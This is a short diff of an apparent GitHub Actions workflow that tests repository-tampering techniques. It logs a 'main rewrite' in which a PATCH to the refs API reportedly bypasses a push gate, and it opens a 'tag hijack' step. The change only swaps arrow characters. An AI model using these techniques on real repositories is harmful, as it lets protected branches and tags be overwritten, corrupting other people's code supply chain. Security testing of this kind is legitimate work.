@@ -100,8 +100,8 @@ jobs:
             -d "{\"sha\":\"${GHOST}\",\"force\":false}")
 
           echo "T5 MAIN REWRITE: ghost=${GHOST:0:12}"
-          echo "  POST  /git/refs        (create) = HTTP_${T5_POST}  ← fails, ref exists"
-          echo "  PATCH /git/refs/heads/main      = HTTP_${T5_PATCH}  ← succeeds, bypasses push gate"
+          echo "  POST  /git/refs        (create) = HTTP_${T5_POST}  <- fails, ref exists"
+          echo "  PATCH /git/refs/heads/main      = HTTP_${T5_PATCH}  <- succeeds, bypasses push gate"
           echo "  CONCLUSION: PATCH has higher effective privilege than POST for existing refs"
 
           # -- TECHNIQUE 6: TAG HIJACK -------------------------------------
